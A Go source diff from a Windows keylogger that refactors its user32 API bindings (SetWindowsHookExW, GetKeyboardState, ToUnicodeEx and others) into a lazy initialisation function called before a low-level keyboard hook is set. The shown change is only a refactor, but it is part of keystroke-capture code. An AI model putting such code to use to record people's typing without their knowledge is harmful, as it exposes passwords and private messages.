@@ -11,18 +11,36 @@ import (
 )
 
 var (
-	user32DLL               = syscall.NewLazyDLL("user32.dll")
-	kernel32DLL             = syscall.NewLazyDLL("kernel32.dll")
-	procSetWindowsHookEx    = user32DLL.NewProc("SetWindowsHookExW")
-	procCallNextHookEx      = user32DLL.NewProc("CallNextHookEx")
-	procUnhookWindowsHookEx = user32DLL.NewProc("UnhookWindowsHookEx")
-	procGetMessage          = user32DLL.NewProc("GetMessageW")
-	procGetKeyboardState    = user32DLL.NewProc("GetKeyboardState")
-	procGetKeyNameText      = user32DLL.NewProc("GetKeyNameTextW")
-	procToUnicodeEx         = user32DLL.NewProc("ToUnicodeEx")
-	procGetKeyboardLayout   = user32DLL.NewProc("GetKeyboardLayout")
-	procMapVirtualKey       = user32DLL.NewProc("MapVirtualKeyW")
+	user32DLL   *syscall.LazyDLL
+	kernel32DLL *syscall.LazyDLL
+
+	procSetWindowsHookEx    *syscall.LazyProc
+	procCallNextHookEx      *syscall.LazyProc
+	procUnhookWindowsHookEx *syscall.LazyProc
+	procGetMessage          *syscall.LazyProc
+	procGetKeyboardState    *syscall.LazyProc
+	procGetKeyNameText      *syscall.LazyProc
+	procToUnicodeEx         *syscall.LazyProc
+	procGetKeyboardLayout   *syscall.LazyProc
+	procMapVirtualKey       *syscall.LazyProc
 )
+
+func initKeyloggerDLLs() {
+	if user32DLL != nil {
+		return // Already initialized
+	}
+	user32DLL = syscall.NewLazyDLL("user32.dll")
+	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
+	procSetWindowsHookEx = user32DLL.NewProc("SetWindowsHookExW")
+	procCallNextHookEx = user32DLL.NewProc("CallNextHookEx")
+	procUnhookWindowsHookEx = user32DLL.NewProc("UnhookWindowsHookEx")
+	procGetMessage = user32DLL.NewProc("GetMessageW")
+	procGetKeyboardState = user32DLL.NewProc("GetKeyboardState")
+	procGetKeyNameText = user32DLL.NewProc("GetKeyNameTextW")
+	procToUnicodeEx = user32DLL.NewProc("ToUnicodeEx")
+	procGetKeyboardLayout = user32DLL.NewProc("GetKeyboardLayout")
+	procMapVirtualKey = user32DLL.NewProc("MapVirtualKeyW")
+}
 
 const (
 	WH_KEYBOARD_LL = 13
@@ -179,6 +197,7 @@ func getSpecialKeyName(vkCode uint32) string {
 
 // startPlatformMonitor starts Windows-specific keyboard monitoring
 func (kl *Keylogger) startPlatformMonitor() error {
+	initKeyloggerDLLs()
 	keylogger = kl
 
 	// Set the low-level keyboard hook
